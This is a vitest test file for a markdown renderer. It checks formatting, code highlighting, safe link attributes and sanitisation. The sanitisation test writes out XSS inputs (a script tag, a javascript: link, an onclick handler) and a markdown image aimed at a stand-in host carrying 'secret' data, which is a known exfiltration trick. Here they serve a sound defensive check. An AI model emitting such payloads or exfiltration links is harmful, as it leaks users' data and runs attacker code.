import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../src/panel/markdown";

describe("markdown rendering", () => {
  it("renders formatting and highlighted code", () => {
    const html = renderMarkdown("# Hi\n\n**bold** and `x`\n\n```js\nconst a = 1;\n```");
    expect(html).toContain("<h1>Hi</h1>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("data-copy");
  });
  it("sanitizes scripts, event handlers and images (no exfiltration via markdown images)", () => {
    const html = renderMarkdown('<script>alert(1)</script><a href="javascript:alert(1)" onclick="x()">x</a> ![t](https://evil.test/p.png?d=secret)');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<img");
  });
  it("opens links in a new tab without opener", () => {
    expect(renderMarkdown("[a](https://x.test)")).toContain('rel="noopener noreferrer"');
  });
});
